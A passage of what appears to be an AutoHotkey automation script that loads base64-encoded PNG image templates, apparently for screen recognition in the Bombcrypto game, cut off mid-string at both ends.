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")
A_Args.PNG.Bombcrypto  := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.HBombcrypto := Gdip_BitmapFromBase64(0,1,Data.PNG "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